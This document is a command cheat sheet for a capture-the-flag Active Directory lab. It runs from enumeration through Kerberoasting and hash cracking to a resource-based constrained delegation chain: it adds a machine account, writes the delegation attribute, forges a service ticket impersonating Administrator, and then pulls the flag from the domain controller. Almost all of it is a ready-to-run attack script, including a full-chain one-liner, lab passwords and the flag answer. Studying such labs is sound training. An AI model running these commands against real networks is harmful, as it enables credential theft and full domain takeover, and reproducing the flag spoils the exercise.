# Quick Command Reference — AD RBCD Lab

## Enumeration

```bash
# Nmap
nmap -p- --min-rate 5000 -T4 10.48.137.121 -oN allports.txt
nmap -sC -sV -p 53,88,135,139,389,445,636,3268,3269,3389 10.48.137.121 -oN services.txt

# LDAP base
ldapsearch -x -H ldap://10.48.137.121 -s base namingContexts

# LDAP users
GetADUsers.py -all ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121

# LDAP groups
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\j.smith" -w 'JSmith@IT2024' \
  -b "DC=ctf,DC=local" "(cn=sysadmin)"

# LDAP user details
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\j.smith" -w 'JSmith@IT2024' \
  -b "DC=ctf,DC=local" "(sAMAccountName=r.williams)" memberOf description

# SMB
crackmapexec smb 10.48.137.121
smbmap -H 10.48.137.121 -u j.smith -p 'JSmith@IT2024' -R
smbclient -L //10.48.137.121 -U 'CTF.LOCAL\j.smith%JSmith@IT2024'

# Users & SPNs
GetADUsers.py -all ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121
GetUserSPNs.py ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121
```

---

## Credential Attacks

```bash
# Kerberoasting
GetUserSPNs.py ctf.local/j.smith:'JSmith@IT2024' \
  -dc-ip 10.48.137.121 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Validate credentials
crackmapexec smb 10.48.137.121 -u t.jones -p 'Helpdesk01!'
crackmapexec smb 10.48.137.121 -u r.williams -p 'Helpdesk01!'

# RDP access
xfreerdp /v:10.48.137.121 /u:j.smith /p:'JSmith@IT2024' /cert:ignore
xfreerdp /v:10.48.137.121 /u:r.williams /p:'Helpdesk01!' /cert:ignore
```

---

## RBCD Chain

```bash
# 1. Check MachineAccountQuota
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(objectClass=domainDNS)" ms-DS-MachineAccountQuota

# 2. Create machine account
addcomputer.py -dc-ip 10.48.137.121 \
  -computer-name HERMESMED$ -computer-pass 'HermesRBCD!2026' \
  ctf.local/r.williams:'Helpdesk01!'

# 3. Write RBCD attribute
rbcd.py -dc-ip 10.48.137.121 \
  -action write -delegate-to DC01$ -delegate-from HERMESMED$ \
  ctf.local/r.williams:'Helpdesk01!'

# 4. Verify RBCD write
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(sAMAccountName=DC01$)" msDS-AllowedToActOnBehalfOfOtherIdentity

# 5. Get service ticket (S4U2Self + S4U2Proxy)
getST.py -dc-ip 10.48.137.121 \
  -spn cifs/DC01.ctf.local -impersonate Administrator \
  ctf.local/HERMESMED$:'HermesRBCD!2026'

# 6. Pass-the-Ticket
export KRB5CCNAME=./Administrator.ccache
klist
smbclient.py -k -no-pass Administrator@dc01.ctf.local
```

---

## Post-Exploitation

```bash
# Inside smbclient shell
use C$
cd Users\Administrator\Desktop
get flag.txt
exit

# View flag
cat flag.txt
# THM{RBCD_S4U2Pr0xy_Tick3t_Th3ft_2_DA}
```

---

## One-Liner (Full Chain)

```bash
# Run from Kali — replace PASSWORD variables as needed
nmap -sC -sV 10.48.137.121 && \
GetADUsers.py ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121 -all && \
GetUserSPNs.py ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121 -request && \
crackmapexec smb 10.48.137.121 -u t.jones -p 'Helpdesk01!' && \
crackmapexec smb 10.48.137.121 -u r.williams -p 'Helpdesk01!' && \
addcomputer.py -dc-ip 10.48.137.121 -computer-name HERMESMED$ \
  -computer-pass 'HermesRBCD!2026' ctf.local/r.williams:'Helpdesk01!' && \
rbcd.py -dc-ip 10.48.137.121 -action write -delegate-to DC01$ \
  -delegate-from HERMESMED$ ctf.local/r.williams:'Helpdesk01!' && \
getST.py -dc-ip 10.48.137.121 -spn cifs/DC01.ctf.local \
  -impersonate Administrator ctf.local/HERMESMED$:'HermesRBCD!2026' && \
export KRB5CCNAME=Administrator.ccache && \
smbclient.py -k -no-pass Administrator@dc01.ctf.local -c 'ls C$\Users\Administrator\Desktop\'
```
